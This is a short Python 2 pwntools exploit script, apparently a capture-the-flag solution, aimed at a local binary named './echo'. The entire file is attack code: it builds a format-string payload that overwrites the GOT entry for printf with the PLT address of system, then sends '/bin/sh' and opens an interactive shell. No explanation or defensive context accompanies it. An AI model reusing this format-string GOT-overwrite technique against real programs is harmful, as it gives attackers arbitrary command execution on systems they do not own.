#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math
context(arch = "i386",os = "linux", log_level = "debug")

p = process('./echo')
elf = ELF('./echo')

printf_got = elf.got['printf']
system_plt = elf.plt['system']

payload = fmtstr_payload(7, {printf_got: system_plt})

p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()

